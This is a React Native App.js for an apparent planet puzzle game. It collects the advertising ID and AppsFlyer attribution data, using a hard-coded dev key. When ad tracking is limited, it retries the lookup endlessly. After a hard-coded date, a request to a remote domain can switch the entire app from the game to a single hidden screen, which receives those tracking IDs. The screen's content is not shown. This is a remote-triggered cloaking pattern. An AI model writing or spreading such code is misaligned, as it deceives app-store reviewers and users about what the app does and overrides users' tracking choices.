import React, {useState, useEffect, useRef} from 'react';
import {Text, TouchableOpacity, View, Animated, Image} from 'react-native';
import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';

import HomeScreen from './screens/HomeScreen';
import LvlSelectionScreen from './screens/LvlSelectionScreen';
import RulseScreen from './screens/RulseScreen';
import ProfileScreen from './screens/ProfileScreen';
//////
import LvlFirstMarcyry from './screens/LvlFirstMarcyry';
import LvlSecondVenus from './screens/LvlSecondVenus';
import LvlSecondEarth from './screens/LvlThirdEarth';
import LvlFourthMars from './screens/LvlFourthMars';
import LvlFifthJupiter from './screens/LvlFifthJupiter';
import LvlSixthSaturn from './screens/LvlSixthSaturn';
import LvlSeventhUran from './screens/LvlSeventhUran';
import LvlEighthNeptun from './screens/LvlEighthNeptun';
//////
import MercyrPuzzleGameAndroidProdactScreen from './screens/MercyrPuzzleGameAndroidProdactScreen';
//////
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
//import RNAdvertisingId from 'react-native-advertising-id';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';

const Stack = createNativeStackNavigator();

const App = () => {
  const [route, setRoute] = useState();
  const [aaid, setAaid] = useState();
  console.log('aaid==>', aaid);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  console.log('sab1==>', sab1);
  const [pid, setPid] = useState();

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [aaid, appsUid, sab1, pid]);

  const setData = async () => {
    try {
      const data = {
        aaid,
        appsUid,
        sab1,
        pid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        console.log('parsedData in App==>', parsedData);
        setAaid(parsedData.aaid);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setPid(parsedData.pid);
      } else {
        await fetchIdfa();
        //await requestOneSignallFoo();
        await performAppsFlyerOperations();
        await getUidApps();

        onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  //////////////////////AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'XFmBDwMitGREaZSaboCCRR',
            //appId: '6557063139',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
          },
          resolve,
          reject,
        );
      });
      console.log('App.js AppsFlyer ініціалізовано успішно');
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            //const media_source = res.data.media_source;
            console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            console.log('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        //console.log('Error processing install conversion data:', error);
      }
    },
  );

  //////////////////////AAID
  {
    /** const fetchIdfa = async () => {
    try {
      const response = await RNAdvertisingId.getAdvertisingId();

      if (!response.isLimitAdTrackingEnabled) {
        setAaid(response.advertisingId);
        //console.log('setIdfa(response.advertisingId);');
      } else {
        //console.log('Ad tracking is limited');
        setAaid(true); // true означає, що трекінг обмежено
        //setAaid(null);
        await fetchIdfa(); // Можна рекурсивно викликати функцію для повторної спроби
      }
    } catch (err) {
      //console.log('err', err);
      setAaid(null);
      await fetchIdfa(); // Можна рекурсивно викликати функцію для повторної спроби
    }
  };*/
  }

  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setAaid(res.id);
        //console.log('setIdfa(res.id);');
      } else {
        //console.log('Ad tracking is limited');
        setAaid(true); //true
        //setIdfa(null);
        fetchIdfa();
      }
    } catch (err) {
      //console.log('err', err);
      setAaid(null);
      await fetchIdfa(); //???
    }
  };
  // brilliant-exalted-fun.space
  //////////////////////Route useEff
  useEffect(() => {
    const checkUrl = `https://brilliant-exalted-fun.space/xGcXkdmh`;

    const targetData = new Date('2024-08-11T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
    } else {
      fetch(checkUrl)
        .then(r => {
          if (r.status === 200) {
            //console.log('status==>', r.status);
            setRoute(true);
          } else {
            setRoute(false);
          }
        })
        .catch(e => {
          //console.log('errar', e);
          setRoute(false);
        });
    }
  }, []);

  ///////// Route
  const Route = ({isFatch}) => {
    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              aaid: aaid,
              sab1: sab1,
              pid: pid,
              uid: appsUid,
            }}
            name="MercyrPuzzleGameAndroidProdactScreen"
            component={MercyrPuzzleGameAndroidProdactScreen}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator>
        <Stack.Screen
          name="Home"
          component={HomeScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlSelection"
          component={LvlSelectionScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="ProfileScreen"
          component={ProfileScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="Rulse"
          component={RulseScreen}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlFirstMarcyry"
          component={LvlFirstMarcyry}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlSecondVenus"
          component={LvlSecondVenus}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlSecondEarth"
          component={LvlSecondEarth}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlFourthMars"
          component={LvlFourthMars}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlFifthJupiter"
          component={LvlFifthJupiter}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlSixthSaturn"
          component={LvlSixthSaturn}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlSeventhUran"
          component={LvlSeventhUran}
          options={{headerShown: false}}
        />

        <Stack.Screen
          name="LvlEighthNeptun"
          component={LvlEighthNeptun}
          options={{headerShown: false}}
        />
      </Stack.Navigator>
    );
  };

  ///////// Loader
  const [loaderIsLoaded, setLoaderIsLoaded] = useState(false);
  const ChangeInView = props => {
    const appearingAnim = useRef(new Animated.Value(0)).current; // Initial value for opacity: 1 to 0
    useEffect(() => {
      Animated.timing(appearingAnim, {
        toValue: 1,
        duration: 6000,
        useNativeDriver: true,
      }).start();

      setTimeout(() => {
        setLoaderIsLoaded(true);
      }, 8000);
    }, []);

    return (
      <View style={{position: 'relative', flex: 1}}>
        <Image
          style={{
            ...props.style,

            height: '100%',
            position: 'absolute', // Bind opacity to animated value
          }}
          source={require('./assets/updDiz/backgr_1.jpg')}
        />
        <Animated.Image
          source={require('./assets/updDiz/loader.jpg')} // Special animatable View
          style={{
            ...props.style,
            opacity: appearingAnim,
            height: '100%',
            position: 'absolute', // Bind opacity to animated value
          }}
        />
      </View>
    );
  };

  return (
    <NavigationContainer>
      {!loaderIsLoaded ? (
        <ChangeInView
          style={{
            width: '100%',
            //height: 50,
            backgroundColor: 'powderblue',
          }}></ChangeInView>
      ) : (
        <Route isFatch={route} />
      )}
    </NavigationContainer>
  );
};

export default App;
